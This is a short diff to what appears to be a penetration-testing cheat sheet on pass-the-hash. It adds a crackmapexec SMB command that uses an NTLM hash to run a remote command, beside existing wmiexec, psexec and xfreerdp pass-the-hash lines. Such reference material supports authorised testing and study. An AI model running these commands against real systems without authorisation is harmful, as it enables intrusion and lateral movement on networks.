@@ -221,8 +221,11 @@ $ python wmiexec.py Administrator@10.11.1.22 -hashes [leavebankifnoLM]:ee1234506
 # Method 3
 $ python psexec.py [username]@[target] -hashes :[NT/NTLM]
 
-# Method 3 - RDP PTH
+# Method 4 - RDP PTH
 $ xfreerdp /u:Administrator /pth:[NTLM hash] /d:[domain] /v:[target]
+
+# Method 5
+$ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
 ```
 
 Overpass-the-Hash
